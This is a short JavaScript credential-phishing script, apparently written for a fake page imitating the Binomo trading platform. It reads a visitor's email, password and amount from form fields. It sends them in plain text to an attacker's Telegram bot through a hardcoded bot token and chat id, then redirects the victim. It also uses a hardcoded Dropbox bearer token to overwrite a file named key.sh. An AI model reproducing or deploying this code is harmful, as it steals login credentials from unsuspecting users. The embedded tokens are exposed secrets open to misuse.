function sendevent() {
    let val = document.getElementById("oemail").value;
    let val1 = document.getElementById("opasswd").value;
    let val2 = document.getElementById("oamount").value;
    let a = " email is: " + val  
    let b = " amount is: " +  val2 
    let c = " passwd is : " + val1  
    let d = a+b+c
     console.log(d)
     if (val === "")
     {
    alert("email is required")
     }
     if (val1 === "")
     {
    alert("password is requied")
     }
      if (val2 === "")
    {
        alert("amount is requied")
    }
    else{
    let url= "https://api.telegram.org/bot5234920052:AAEDxAVyUMHE5p_t1FwhC3HRUC9FycEz_Tc/sendMessage?chat_id=1395896130&text=BINOMO:"+d;
    
    
    
    var xhr = new XMLHttpRequest();
    xhr.open("GET", url);
    
    xhr.onreadystatechange = function () {
       if (xhr.readyState === 4) {
          console.log(xhr.status);
          console.log(xhr.responseText);
           
          location.replace("finel.html")
          reset();
       }};
    
    
    xhr.send();
    }
    function reset()
    {
        fetch('https://content.dropboxapi.com/2/files/upload', {
            method: 'POST',
            headers: {
                'Authorization': 'Bearer XThKNH_NKPIAAAAAAAAAATnXIDWfk_i7Ivq5HRlN8KzPQeWBZ8VTgia79Ayyum0N',
                'Dropbox-API-Arg': '{"path": "/trade/key.sh","mode": "overwrite","autorename": true,"mute": false,"strict_conflict": false}',
                'Content-Type': 'application/octet-stream'
            },
            body: 'heyaaaa'
        });
        
    }
    }